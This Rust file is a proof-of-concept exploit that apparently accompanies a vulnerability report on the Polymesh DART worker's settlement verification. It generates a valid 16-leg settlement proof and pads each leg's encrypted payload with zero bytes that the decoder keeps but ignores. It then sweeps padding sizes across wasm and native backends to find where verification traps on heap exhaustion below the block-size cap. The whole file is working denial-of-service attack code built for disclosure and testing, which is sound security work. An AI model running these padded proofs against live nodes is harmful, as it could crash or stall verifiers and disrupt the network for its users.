// PoC: multi-leg `CreateSettlement` heap-baseline + padded trap-floor measurement.
//
// The `SenderAffirmation` sweep measured the smallest-baseline request. The report's attack is
// `create_settlement`, whose batched verify collects tuples for up to SETTLEMENT_MAX_LEGS (16) legs
// simultaneously, so its non-padding baseline B_N grows with leg count. This binary generates a
// valid N-leg settlement (worst case: hidden-asset legs, 2 mediators + 2 auditors), runs it through
// a chosen worker backend, and sweeps per-leg padding to find the trap floor vs the ~3.9 MiB block
// cap. Run the instrumented wasm blob with RUST_LOG=warn to also read guest peak heap (PEAKHEAP).
//
// Usage: settlement_poc <native|wasmer|polkavm|wasmtime> <n_legs>

use codec::{Compact, Decode, Encode};
use polymesh_dart::{
    ASSET_TREE_HEIGHT, ASSET_TREE_L, ASSET_TREE_M, AccountKeys, AnySettlementLegProof,
    AssetKeysLookup, AssetState, EncryptionKeyPair, LegBuilder, LegConfig, LegEncrypted,
    PolymeshLimits, SettlementBuilder, SettlementProof,
    curve_tree::{AssetTreeConfig, ProverCurveTree},
};
use polymesh_worker::{backend::*, *};
use polymesh_worker_common::{PROTOCOL_PDART, ResolvedInitializationMethod};
use polymesh_worker_protocol_dart_v1::{
    AssetTreeRoot, DartWorkRequest, DartWorkResponse, VerifyDartAssetRequest,
};
use rand_chacha::ChaCha20Rng;
use rand_core::SeedableRng;

type AssetProverTree = ProverCurveTree<ASSET_TREE_L, ASSET_TREE_M, AssetTreeConfig>;

type SettlementReq = (AssetTreeRoot, AssetKeysLookup, SettlementProof<PolymeshLimits>);

/// Inflate a SCALE-encoded `LegEncrypted` by `pad_len` trailing zero bytes (retained in
/// `WrappedCanonical::wrapped`, ignored by `deserialize_compressed`).
fn pad_leg(raw_leg_enc: &[u8], pad_len: usize) -> LegEncrypted {
    let mut input = &raw_leg_enc[..];
    let Compact(canonical_len) = Compact::<u32>::decode(&mut input).unwrap();
    let mut expanded = Compact((canonical_len as usize + pad_len) as u32).encode();
    expanded.extend_from_slice(input);
    expanded.resize(expanded.len() + pad_len, 0);
    <LegEncrypted as Decode>::decode(&mut &expanded[..]).unwrap()
}

/// Pad every leg's `leg_enc` in a settlement proof by `per_leg_pad` bytes.
fn pad_settlement(
    proof: &SettlementProof<PolymeshLimits>,
    per_leg_pad: usize,
) -> SettlementProof<PolymeshLimits> {
    let mut p = proof.clone();
    for leg in p.legs.iter_mut() {
        let cur = leg.leg_enc().encode();
        let padded = pad_leg(&cur, per_leg_pad);
        match leg {
            AnySettlementLegProof::HiddenAssetId(x) => x.leg_enc = padded,
            AnySettlementLegProof::RevealedAssetId(x) => x.leg_enc = padded,
        }
    }
    p
}

/// Generate a valid N-leg settlement (hidden-asset legs, 2 mediators + 2 auditors) and assemble the
/// worker `CreateSettlement` inputs. Cached to disk so backend runs reuse the same proof.
fn build_or_load_settlement(n_legs: usize) -> SettlementReq {
    let path = std::env::var("SETTLEMENT_FIXTURE_DIR").unwrap_or_else(|_| ".".to_string());
    let file = format!("{path}/settlement_{n_legs}legs.scale");
    if let Ok(bytes) = std::fs::read(&file) {
        if let Ok(req) = <SettlementReq>::decode(&mut &bytes[..]) {
            println!("Loaded settlement fixture ({n_legs} legs) from {file}");
            return req;
        }
    }

    println!("Generating {n_legs}-leg settlement proof ...");
    let now = std::time::Instant::now();
    let mut rng = ChaCha20Rng::seed_from_u64(0xDEAD_BEEF);

    // Max asset encryption targets: MAX_ASSET_ENC_KEYS = 2 total (auditors + mediators). Use 2
    // mediators (mediator encryptions are the largest per-key) => largest valid leg ciphertext.
    let med0 = AccountKeys::from_seed("mediator-0").unwrap();
    let med1 = AccountKeys::from_seed("mediator-1").unwrap();
    let mediators = [
        (med0.acct.public, med0.enc.public),
        (med1.acct.public, med1.enc.public),
    ];
    let auditors: [polymesh_dart::EncryptionPublicKey; 0] = [];
    let asset_state = AssetState::new::<()>(0, &mediators, &auditors).unwrap();

    let mut tree = AssetProverTree::new(ASSET_TREE_HEIGHT).unwrap();
    let mut lookup = AssetKeysLookup::new();
    tree.insert(asset_state.commitment().unwrap()).unwrap();
    lookup.add(asset_state.clone());
    tree.store_root().unwrap();
    let root: AssetTreeRoot = tree.root().unwrap();

    let alice = AccountKeys::from_seed("alice").unwrap();
    let bob = AccountKeys::from_seed("bob").unwrap();

    let mut builder = SettlementBuilder::<()>::new(b"poc-venue");
    for _ in 0..n_legs {
        builder = builder.leg(LegBuilder {
            sender: alice.public_keys(),
            receiver: bob.public_keys(),
            asset: asset_state.clone(),
            amount: 1,
            config: LegConfig::default(), // hidden asset id => curve-tree membership (worst case)
            public_enc_keys: vec![],
        });
    }
    let proof0 = builder.encrypt_and_prove(&mut rng, &tree).unwrap();
    // Convert SettlementProof<()> -> SettlementProof<PolymeshLimits> (SCALE-identical).
    let proof: SettlementProof<PolymeshLimits> =
        Decode::decode(&mut proof0.encode().as_slice()).unwrap();
    println!("Generated in {:?}", now.elapsed());

    let req: SettlementReq = (root, lookup, proof);
    let _ = std::fs::write(&file, req.encode());
    req
}

pub fn main() {
    env_logger::init();
    let backend_kind = std::env::args()
        .nth(1)
        .and_then(|arg| match arg.to_lowercase().as_str() {
            "polkavm" => Some(BackendKind::PolkaVM),
            "native" => Some(BackendKind::Native),
            "wasmtime" => Some(BackendKind::Wasmtime),
            "wasmer" => Some(BackendKind::Wasmer),
            _ => None,
        })
        .expect("first arg must be a backend kind");
    let n_legs: usize = std::env::args()
        .nth(2)
        .and_then(|a| a.parse().ok())
        .expect("second arg must be n_legs");

    let (root, asset_lookup, base_proof) = build_or_load_settlement(n_legs);
    let base_leg_enc_len = base_proof.legs[0].leg_enc().encode().len();
    println!(
        "n_legs={n_legs}  unpadded encoded proof size = {} bytes  (per-leg leg_enc = {} bytes)",
        base_proof.encode().len(),
        base_leg_enc_len
    );

    let native_backend = polymesh_worker_native::NativeBackend;
    println!("Using backend: {:?}", backend_kind);
    let backends = Backends::with_backends(&[backend_kind], Some(Box::new(native_backend)));
    let mut loader = StaticModules::new();
    let protocol = Protocol {
        id: PROTOCOL_PDART,
        version: ProtocolVersion {
            major: 0,
            minor: 1,
            patch: 0,
        },
    };
    let module = backends
        .load_module(protocol, &mut loader)
        .expect("No backend available");
    let config_hash = loader
        .get_protocol_module_config_hash(protocol)
        .expect("config hash");
    let config = loader
        .get_protocol_module_config(protocol, config_hash)
        .expect("config");
    let initialization_method = loader
        .resolve_initialization_method(protocol, &config.initialization_method)
        .expect("init method");
    let mut instance0 = module.instantiate().expect("instantiate");
    match initialization_method {
        ResolvedInitializationMethod::NoInitializationNeeded => {}
        ResolvedInitializationMethod::InitializeNoContext => {
            instance0.initialize(None).expect("init");
        }
        ResolvedInitializationMethod::ContextData(ctx) => {
            instance0.initialize(Some(ctx.as_ref())).expect("init ctx");
        }
    }
    let saved_ctx = instance0.save_context().expect("save ctx");

    // Total-padding sweep (KiB), spread evenly across the N legs. Fine points around the ~3 MiB
    // heap-trap floor to pin it vs the ~3.9 MiB single-block cap.
    let total_pad_kib: [usize; 16] = [
        0, 1024, 2048, 2560, 3072, 3200, 3328, 3456, 3584, 3686, 3789, 3891, 4096, 5120, 8192,
        10240,
    ];

    for total_pad in total_pad_kib.iter().map(|k| k * 1024) {
        let per_leg_pad = total_pad / n_legs;
        let proof = if per_leg_pad == 0 {
            base_proof.clone()
        } else {
            pad_settlement(&base_proof, per_leg_pad)
        };
        let req = DartWorkRequest::VerifyProof(VerifyDartAssetRequest::CreateSettlement {
            root: root.clone(),
            asset_lookup: asset_lookup.clone(),
            proof,
        });
        let work = WorkRequest::new(req);
        let req_len = work.0.len();

        let mut inst = module.instantiate().expect("instantiate");
        inst.initialize(saved_ctx.as_deref()).expect("init ctx");

        for i in 0..4 {
            let now = std::time::Instant::now();
            let res = inst.execute(&work);
            let pretty = match &res {
                Ok(Ok(resp)) => match resp.decode::<DartWorkResponse>() {
                    Ok(_) => format!("Ok(Ok(WorkResponse[{} bytes], decoded OK))", resp.0.len()),
                    Err(e) => format!("Ok(Ok(WorkResponse[{} bytes], DECODE-ERR {e:?}))", resp.0.len()),
                },
                Ok(Err(e)) => format!("Ok(Err({e:?}))"),
                Err(e) => format!("Err({e:?})"),
            };
            println!(
                "SETTLE backend={backend_kind:?} n_legs={n_legs} total_pad_kib={} per_leg_pad={per_leg_pad} req_len={req_len} iter={i} elapsed={:?} => {pretty}",
                total_pad / 1024,
                now.elapsed()
            );
        }
    }
}
